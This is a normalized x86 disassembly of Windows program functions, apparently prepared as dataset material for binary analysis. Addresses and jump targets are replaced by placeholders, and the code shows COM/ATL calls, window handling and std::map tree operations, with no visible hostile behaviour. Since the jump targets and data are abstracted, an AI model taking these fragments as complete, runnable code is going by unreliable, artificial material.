add esp 0x1c
sub_40b730
sub esp 0x8
push esi
push 0x0
mov esi ecx
call [ _time64@IAT ]
xor ecx ecx
mov cl [ rw-data ]
mov [ esp + 0xc ] edx
mov edx [ rw-data ]
push ecx
mov ecx [ rw-data ]
push edx
mov edx [ esi + 0xc8 ]
push ecx
mov ecx [ esi + 0x10c ]
push edx
sub eax ecx
push eax
push 0x1
call sub_414860
add esp 0x1c
pop esi
add esp 0x8
retn
sub_40b780
mov eax [ rw-data ]
test eax eax
push esi
push edi
mov esi ecx
jne r-xdata
lea eax [ esi + 0x20 ]
push eax
push rw-data
push rw-data
push rw-data
call [ Ordinal_ATL71_45@IAT ]
mov edx [ esp + 0x18 ]
test edx edx
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
mov edx 0x56000000
mov edi [ esp + 0x24 ]
push edi
push eax
mov eax [ esp + 0x28 ]
push eax
mov eax [ esp + 0x28 ]
push eax
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x28 ]
push ecx
push edx
mov ecx esi
call sub_409170
pop edi
pop esi
retn 0x1c
sub_40b7f0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b820
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430118
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
jne r-xdata
mov [ edi ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x10 ] 0x1
mov ecx [ ecx ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call [ Ordinal_ATL71_47@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax 0x80004003
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0xc
retn 0x8
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov edx [ eax ]
push edi
push ecx
push eax
call [ edx ]
mov esi eax
mov ecx [ esp + 0x8 ]
pop edi
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x8
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_40b950
push ebp
mov ebp esp
push 0xffffffff
push sub_430141
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x2c
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_40acb0
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_40b9f0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0xfffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
shl eax 0x4
push edi
mov edi eax
push edi
call sub_42e3bc
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40b4f0
sub_40baa0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430168
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
jne r-xdata
mov [ edi ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x10 ] 0x1
mov ecx [ ecx ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call [ Ordinal_ATL71_48@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax 0x80004003
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0xc
retn 0x8
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov edx [ eax ]
push edi
push ecx
push eax
call [ edx ]
mov esi eax
mov ecx [ esp + 0x8 ]
pop edi
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x8
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_40bb80
push esi
mov esi ecx
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov eax 0x1
pop esi
retn
mov edx eax
push edx
call [ DestroyWindow@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
mov edx [ esi + 0x84 ]
mov ecx [ esi + 0x88 ]
push edx
lea eax [ esi + 0x70 ]
push eax
push ecx
call [ Ordinal_ATL71_11@IAT ]
mov [ esi + 0x84 ] 0xfefefefe
mov eax [ esi + 0x88 ]
test eax eax
jne r-xdata
push 0x80004003
call sub_42cee0
mov [ esi + 0x8c ] 0x0
pop esi
retn
mov eax [ esi + 0x88 ]
mov edx [ eax ]
push eax
call [ edx + 0x80 ]
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov [ esi + 0x88 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40bc30
sub esp 0x10
push esi
push 0x0
push ecx
mov eax esp
mov [ eax ] 0x0
mov esi ecx
mov eax [ esi + 0xb8 ]
mov ecx [ esi + 0xbc ]
push 0x88
push 0x90000000
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
call sub_40e8b0
mov ecx eax
call sub_40e800
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
push ecx
mov eax esp
lea ecx [ esp + 0x1c ]
mov [ eax ] ecx
push 0x0
mov ecx esi
call sub_40b780
test eax eax
jne r-xdata
mov edx [ esi + 0x50 ]
push 0x0
push edx
call [ ShowWindow@IAT ]
mov eax 0x1
pop esi
add esp 0x10
retn
pop esi
add esp 0x10
retn
sub_40bce0
push esi
mov esi ecx
call sub_403d70
mov ecx [ r--data ]
lea eax [ esi + 0x4 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ecx [ r--data ]
lea eax [ esi + 0x14 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
xor eax eax
mov [ esi + 0x24 ] ax
mov [ esi + 0x26 ] ax
mov eax esi
pop esi
retn
sub_40bd50
push ecx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call sub_40b440
cmp eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] ecx
pop esi
pop ecx
retn 0x8
add eax 0xc
push eax
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
jne r-xdata
lea eax [ esp + 0x14 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] ecx
pop esi
pop ecx
retn 0x8
sub_40bdc0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430189
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x9249248
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_40b950
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x28 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x28 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x28 ] bl
mov [ edx + 0x28 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x28 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x28 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x28 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x28 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_40b360
mov esi ecx
push esi
mov ecx edi
call sub_40a9e0
mov eax [ esi + 0x4 ]
mov [ eax + 0x28 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x28 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_40a9e0
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_40b360
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_40bf80
push ebp
mov ebp esp
push 0xffffffff
push sub_4301a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x2c
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x28 ] bl
mov [ eax + 0x29 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_40c020
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x29 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_40c020
mov esi [ esi ]
mov ecx edi
call sub_40add0
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x29 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_40c080
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ VariantClear@IAT ]
add esi 0x10
cmp esi ebx
jne r-xdata
push eax
call sub_42cee0
push esi
call edi
test eax eax
jge r-xdata
pop edi
sub_40c0b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4301b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
push esi
mov ecx ebx
call sub_40bb40
dec edi
mov [ ebp + 0xc ] edi
add esi 0x10
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_40c118
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_40bb60
add esi 0x10
cmp esi edi
jne r-xdata
sub_40c140
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov esi [ edi + 0x4 ]
mov cl [ esi + 0x29 ]
test cl cl
mov al 0x1
mov [ esp + 0x10 ] al
jne r-xdata
test al al
mov esi edi
mov [ esp + 0x1c ] esi
je r-xdata
mov edi edi
lea edx [ esi + 0xc ]
push ebp
push edx
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp edi [ ecx ]
jne r-xdata
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
mov [ eax + 0x4 ] 0x0
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x10 ]
push ebp
push edi
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx ebx
call sub_40bdc0
mov edx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea ecx [ esp + 0x1c ]
call sub_40ac40
mov esi [ esp + 0x1c ]
push ebp
push edi
push 0x1
lea edx [ esp + 0x28 ]
push edx
mov ecx ebx
call sub_40bdc0
mov ecx [ eax ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
pop ecx
retn 0x8
lea eax [ esi + 0xc ]
push eax
push ebp
mov edi esi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
mov [ esp + 0x10 ] al
je r-xdata
mov cl [ esi + 0x29 ]
test cl cl
je r-xdata
sub_40c220
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4301d5
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebp
mov ebp ecx
mov cl [ eax + 0x29 ]
test cl cl
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea ecx [ esp + 0x6c ]
mov [ esp + 0x10 ] ebx
call sub_40ab70
mov eax [ ebx ]
mov cl [ eax + 0x29 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x54 ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_40af50
push r--data
lea ecx [ esp + 0x28 ]
push ecx
call _CxxThrowException
mov edx [ ebx + 0x8 ]
mov cl [ edx + 0x29 ]
test cl cl
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x6c ]
cmp ecx ebx
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x29 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebx ]
mov [ ecx ] edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x29 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov eax [ ebx ]
cmp eax [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp [ ebx + 0x8 ] ecx
jne r-xdata
mov al [ edi + 0x29 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebx + 0x28 ]
mov al [ ecx + 0x28 ]
mov [ ecx + 0x28 ] dl
mov [ ebx + 0x28 ] al
mov eax [ esp + 0x10 ]
mov cl [ eax + 0x28 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ edi + 0x29 ]
test al al
je r-xdata
push edi
call sub_40a9a0
add esp 0x4
mov eax esi
jmp r-xdata
mov [ esp + 0x60 ] 0xffffffff
mov ecx [ esp + 0x10 ]
add ecx 0xc
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
mov eax [ ebp + 0x8 ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
push edi
call sub_40a980
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov ecx [ esp + 0x60 ]
mov eax [ esp + 0x5c ]
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x54
retn 0x8
dec eax
mov [ ebp + 0x8 ] eax
mov [ edi + 0x28 ] bl
cmp [ edi + 0x28 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov cl [ eax + 0x28 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x28 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x29 ]
test cl cl
jne r-xdata
mov [ eax + 0x28 ] bl
push esi
mov ecx ebp
mov [ esi + 0x28 ] 0x0
call sub_40a9e0
mov eax [ esi ]
mov cl [ eax + 0x29 ]
test cl cl
jne r-xdata
mov [ eax + 0x28 ] bl
push esi
mov ecx ebp
mov [ esi + 0x28 ] 0x0
call sub_40b360
mov eax [ esi + 0x8 ]
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x4 ]
mov edi esi
cmp edi eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x28 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x28 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x28 ] bl
je r-xdata
mov cl [ esi + 0x28 ]
mov [ eax + 0x28 ] cl
mov [ esi + 0x28 ] bl
mov edx [ eax ]
push esi
mov ecx ebp
mov [ edx + 0x28 ] bl
call sub_40a9e0
mov edx [ eax + 0x8 ]
mov [ edx + 0x28 ] bl
push eax
mov ecx ebp
mov [ eax + 0x28 ] 0x0
call sub_40b360
mov eax [ esi ]
mov [ eax + 0x28 ] 0x0
mov cl [ esi + 0x28 ]
mov [ eax + 0x28 ] cl
mov [ esi + 0x28 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx ebp
mov [ edx + 0x28 ] bl
call sub_40b360
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x28 ] bl
push eax
mov ecx ebp
mov [ eax + 0x28 ] 0x0
call sub_40a9e0
mov eax [ esi + 0x8 ]
sub_40c4e0
push 0xffffffff
push sub_4301e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_404880
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40c540
push 0xffffffff
push sub_430238
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x14 ] 0x1
lea eax [ esp + 0x4 ]
push eax
push r--data
call sub_40baa0
test eax eax
jge r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x14 ] 0x4
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x30 ]
push edx
lea edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x2c ]
push edx
mov edx [ esi ]
push edx
mov edx [ esp + 0x30 ]
push edx
push eax
call [ ecx + 0x10 ]
mov esi eax
test esi esi
jl r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esi ]
push ecx
mov ecx [ esp + 0x2c ]
push edx
push eax
push ecx
call [ Ordinal_ATL71_40@IAT ]
mov esi eax
jmp r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
test ecx ecx
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
mov [ ecx ] eax
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x18
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push ecx
push r--data
push eax
call [ edx ]
mov esi eax
sub_40c650
push esi
mov esi ecx
call sub_40bf80
mov [ esi + 0x4 ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_40c680
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_40c020
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_40c6b0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ VariantClear@IAT ]
add esi 0x10
cmp esi ebx
jne r-xdata
push eax
call sub_42cee0
push esi
call edi
test eax eax
jge r-xdata
pop edi
sub_40c6e0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_40c0b0
add esp 0x18
retn
sub_40c710
push ebp
mov ebp esp
push 0xffffffff
push sub_430273
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x14 ] ebx
call [ rw-data ]
mov esi [ ebp + 0x10 ]
cmp [ esi ] 0x8
mov [ ebp - 0x10 ] eax
jne r-xdata
mov [ ebp + 0x13 ] 0x0
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
mov al [ ebp + 0x13 ]
test al al
je r-xdata
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
mov eax esi
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov ecx [ ebp - 0x10 ]
mov eax esp
push ecx
push esi
push edi
push eax
call sub_40a610
mov esi [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
lea esp [ ebp - 0x44 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edi [ eax + 0xb0 ]
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0x18 ]
push ecx
mov ebx 0x1
lea ecx [ eax + 0xac ]
mov [ ebp - 0x14 ] ebx
call sub_40bd50
cmp edi [ eax ]
mov [ ebp + 0x13 ] bl
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
mov eax esi
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov edx [ ebp - 0x10 ]
mov eax esp
push edx
push esi
push edi
push eax
call sub_40a610
xor eax eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
